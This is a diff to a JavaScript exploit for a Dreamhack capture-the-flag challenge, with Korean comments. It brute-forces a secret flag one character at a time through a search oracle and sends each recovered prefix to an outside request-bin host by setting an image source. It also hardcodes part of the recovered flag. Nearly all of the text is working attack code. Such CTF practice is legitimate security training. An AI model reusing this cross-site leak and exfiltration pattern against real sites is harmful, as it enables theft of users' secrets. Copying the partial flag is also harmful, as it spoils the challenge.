@@ -26,18 +26,27 @@
     }
 
     async function exploit() {
-        let chars = "0123456789abcdef}"
-        let secret = "DH{";
+        let chars = "0123456789abcdef}";
+        let secret = "DH{22d1445ad68e1";  // ✅ 이전까지 찾은 값으로 시작
 
         while (!secret.includes("}")) {
+            let found = false;
             for (let c of chars) {
                 if (await search(secret + c)) {
                     secret += c;
-                    img.src = `https://poyotgb.request.dreamhack.games/${secret}`;
+                    img.src = `https://siriguw.request.dreamhack.games/${secret}`;  // ✅ 중간 결과 리포트
+                    found = true;
                     break;
                 }
             }
+            if (!found) {
+                // 만약 어떤 문자도 일치하지 않는다면 무한루프 방지
+                console.log("탐색 실패: 현재 시크릿", secret);
+                break;
+            }
         }
+
+        console.log("플래그:", secret);
     }
 
     exploit();
